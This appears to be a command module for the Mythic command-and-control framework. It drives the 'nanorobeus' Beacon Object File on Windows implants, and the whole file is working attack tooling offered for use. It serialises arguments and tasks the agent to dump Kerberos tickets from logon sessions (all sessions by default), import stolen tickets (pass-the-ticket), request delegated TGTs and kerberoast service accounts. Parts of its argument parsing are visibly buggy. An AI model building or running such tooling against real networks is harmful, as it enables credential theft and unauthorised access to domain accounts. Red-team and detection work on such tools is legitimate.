from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
import binascii
import cmd 
import struct
import os
import subprocess



class OfArg:
    def __init__(self, arg_data, arg_type):
        self.arg_data = arg_data
        self.arg_type = arg_type

def generateWString(arg):
    return OfArg(arg.encode('utf-16le') + b'\x00\x00', 0)

def generateString(arg):
    return OfArg(arg.encode('ascii') + b'\x00', 0)

def generate32bitInt(arg):
    return OfArg(struct.pack('<I', int(arg)), 1)

def generate16bitInt(arg):
    return OfArg(struct.pack('<H', int(arg)), 2)

def dobinarystuff(arg):
    return OfArg(arg)

def SerialiseArgs(OfArgs):
    output_bytes = b''
    for of_arg in OfArgs:
        output_bytes += struct.pack('<I', of_arg.arg_type)
        output_bytes += struct.pack('<I', len(of_arg.arg_data))
        output_bytes += of_arg.arg_data
    return output_bytes

class NanoRubeusArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line)
        self.args = [
            CommandParameter(
                name="action",
                type=ParameterType.ChooseOne,
                description="Action to perform",
                choices=["luid", "sessions", "klist", "dump", "ptt", "purge", "tgtdeleg", "kerberoast"],
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=0,
                        required=True,
                        default_value="check",
                        )
                    ],
            ),
            CommandParameter(
                name="luid",
                type=ParameterType.String,
                description="Action to perform",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        default_value="",
                        )
                    ],
            ),
            CommandParameter(
                name="ticket",
                type=ParameterType.String,
                description="Base64 encoded ticket",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        default_value="",
                        )
                    ],
            ),
            CommandParameter(
                name="spn",
                type=ParameterType.String,
                description="Action to perform",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        default_value="",
                        )
                    ],
            ),
            CommandParameter(
                name="all",
                type=ParameterType.Boolean,
                description="Action to perform",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        default_value=False,
                        )
                    ],
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
        else:
            cmd_split = self.command_line.split()
            action = cmd_split[0]
            self.args["action"].value = action
            if action == "luid":
                pass
            elif action == "sessions":
                if "all" in cmd_split or "-all" in cmd_split:
                    self.args["all"].value = True
                else:
                    self.args["luid"].value = cmd_split[1]
            elif action == "klist":
                if "all" in cmd_split or "-all" in cmd_split:
                    self.args["all"].value = True
                    self.args["luid"].value = True
                else:
                    self.args["luid"].value = cmd_split[1]
            elif action == "dump":
                if "all" in cmd_split or "-all" in cmd_split:
                    self.args["all"].value = True
                else:
                    self.args["luid"].value = cmd_split[1]
            elif action == "ptt":
                self.args["ticket"].value = cmd_split[0]
                self.args["luid"].value = cmd_split[1]
            elif action == "purge":
                self.args["luid"].value = cmd_split[1]
            elif action == "tgtdeleg":
                self.args["spn"].value = cmd_split[1]
            elif action == "kerberoast":
                self.args["spn"].value = cmd_split[1]
            else:
                raise Exception("Invalid action specified")         
    
    async def parse_dictionary(self, dictionary):
        self.load_args_from_dictionary(dictionary)

class NanoRubeusCommand(CommandBase):
    cmd = "nanorubeus"
    needs_admin = False
    help_cmd = """Usage: nanorubeus [command] [options]
luid - get current logon ID
sessions [-luid <0x0> | -all] - get logon sessions
klist [-luid <0x0> | -all] - list Kerberos tickets
dump [-luid <0x0> | -all] - dump Kerberos tickets
ptt -ticket <base64> [-luid <0x0>] - import Kerberos ticket into a logon session
purge [-luid <0x0>] - purge Kerberos tickets
tgtdeleg -spn <spn> - retrieve a usable TGT for the current user
kerberoast -spn <spn> - perform Kerberoasting against specified SPN"""
    description = """ """
    version = 1
    script_only = True
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    supported_ui_features = []
    author = "@wavvs"
    argument_class = NanoRubeusArguments
    attackmapping = []
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
        builtin=True
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        
        # Get our architecture version
        arch = task.callback.architecture


        if(arch=="x86"):
            raise Exception("BOF's are currently only supported on x64 architectures")

        bof_path = f"/Mythic/athena/mythic/agent_functions/misc_bofs/nanorubeus/nanorobeus.{arch}.o"
        if(os.path.isfile(bof_path) == False):
            await self.compile_bof("/Mythic/athena/mythic/agent_functions/misc_bofs/nanorubeus/")

        # Read the COFF file from the proper directory
        with open(bof_path, "rb") as coff_file:
            encoded_file = base64.b64encode(coff_file.read())

        # Upload the COFF file to Mythic, delete after using so that we don't have a bunch of wasted space used
        file_resp = await MythicRPC().execute("create_file",
                                    task_id=task.id,
                                    file=encoded_file,
                                    delete_after_fetch=True)  
        encoded_args = ""
        OfArgs = []

        action = str(task.args.get_arg("action")).lower()
        #Action First
        OfArgs.append(generateString(action))
        # luid - get current logon IDX
        # sessions [/luid <0x0>| /all] - get logon sessions
        # klist [/luid <0x0> | /all] - list Kerberos tickets
        # dump [/luid <0x0> | /all] - dump Kerberos tickets
        # ptt <base64> [/luid <0x0>] - import Kerberos ticket into a logon session
        # purge [/luid <0x0>] - purge Kerberos tickets
        # tgtdeleg <spn> - retrieve a usable TGT for the current user
        # kerberoast <spn> - perform Kerberoasting against specified SPN
        #Specifying a LUID returns "Unknown Command"

        if action == "luid":
            pass
        elif action == "sessions":
            luid = task.args.get_arg("luid")
            do_all = task.args.get_arg("all")
            if do_all:
                OfArgs.append(generateString("/all"))
            elif luid:
                if luid.lower() == "all":
                    OfArgs.append(generateString("/all"))
                else:
                    OfArgs.append(generateString("/luid"))
                    OfArgs.append(generateString(luid))
            else:
                OfArgs.append(generateString("/all"))
        elif action == "klist":
            luid = task.args.get_arg("luid")
            do_all = task.args.get_arg("all")
            if do_all:
                OfArgs.append(generateString("/all"))
            elif luid:
                if luid.lower() == "all":
                    OfArgs.append(generateString("/all"))
                else:
                    OfArgs.append(generateString("/luid"))
                    OfArgs.append(generateString(luid))
            else:
                OfArgs.append(generateString("/all"))
        elif action == "dump":
            luid = task.args.get_arg("luid")
            do_all = task.args.get_arg("all")
            if do_all:
                OfArgs.append(generateString("/all"))
            elif luid:
                if luid.lower() == "all":
                    OfArgs.append(generateString("/all"))
                else:
                    OfArgs.append(generateString("/luid"))
                    OfArgs.append(generateString(luid))
            else:
                OfArgs.append(generateString("/all"))
        elif action == "ptt":
            ticket = task.args.get_arg("ticket")
            luid = task.args.get_arg("luid")

            if ticket:
                OfArgs.append(generateString(ticket))
            else:
                raise Exception("No ticket specified")
            
            if luid:
                    OfArgs.append(generateString("/luid"))
                    OfArgs.append(generateString(luid))
        elif action == "purge":
            luid = task.args.get_arg("luid")
            if luid:
                    OfArgs.append(generateString("/luid"))
                    OfArgs.append(generateString(luid))
        elif action == "tgtdeleg":
            spn = task.args.get_arg("spn")
            if spn:
                OfArgs.append((generateString(spn)))
            else:
                raise Exception("No SPN specified")
        elif action == "kerberoast":
            spn = task.args.get_arg("spn")
            if spn:
                OfArgs.append((generateString(spn)))
            else:
                raise Exception("No SPN specified")
        else:
            raise Exception("Invalid action specified")

        encoded_args = base64.b64encode(SerialiseArgs(OfArgs)).decode()
        resp = await MythicRPC().execute("create_subtask_group", tasks=[
            {"command": "coff", "params": {"coffFile":file_resp.response["agent_file_id"], "functionName":"go","arguments": encoded_args, "timeout":"60"}},
            ], 
            subtask_group_name = "coff", parent_task_id=task.id)

        # We did it!
        return task

    async def process_response(self, response: AgentResponse):
        pass

    async def compile_bof(self, bof_path):
        p = subprocess.Popen(["make"], cwd=bof_path)
        p.wait()
        streamdata = p.communicate()[0]
        rc = p.returncode
        if rc != 0:
            raise Exception("Error compiling BOF: " + str(streamdata))
